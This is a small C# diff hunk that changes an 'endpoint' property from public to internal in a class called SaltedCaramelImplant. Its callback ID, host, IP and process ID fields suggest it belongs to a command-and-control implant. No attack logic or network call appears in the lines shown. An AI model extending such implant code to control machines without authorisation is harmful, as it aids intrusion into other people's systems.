@@ -49,7 +49,7 @@ namespace SaltedCaramel
     internal class SaltedCaramelImplant
     {
         internal string callbackId { get; set; }
-        public string endpoint { get; set; }
+        internal string endpoint { get; set; }
         public string host { get; set; }
         public string ip { get; set; }
         public int pid { get; set; }
